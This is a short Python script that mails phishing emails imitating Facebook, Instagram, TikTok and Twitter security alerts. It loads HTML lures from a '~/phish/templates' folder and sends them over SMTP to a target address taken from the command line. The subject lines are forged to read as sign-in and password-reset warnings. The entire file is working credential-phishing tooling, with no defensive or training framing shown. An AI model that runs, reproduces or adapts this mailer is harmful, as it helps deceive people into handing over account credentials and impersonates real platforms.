#!/usr/bin/env python3
import smtplib, pathlib, sys
from email.message import EmailMessage

SMTP_HOST, SMTP_PORT = "localhost", 25        # or smtp.sendgrid.net:587
FROM = "no-reply@yourdomain.com"
PLATFORM = sys.argv[1]                         # facebook|instagram|tiktok|twitter
TO = sys.argv[2]

tpl = pathlib.Path(f"~/phish/templates/{PLATFORM}.html").expanduser().read_text()
subj = {"facebook":"New sign-in to your Facebook account — please confirm",
        "instagram":"We noticed a new login to your Instagram",
        "tiktok":"Security alert: password update required for TikTok",
        "twitter":"Suspicious sign-in attempt on X"}[PLATFORM]

msg = EmailMessage()
msg["Subject"], msg["From"], msg["To"] = subj, FROM, TO
msg.add_alternative(tpl, subtype="html")

with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as s:
    s.send_message(msg)
print(f"[✓] {PLATFORM} reset email sent to {TO}")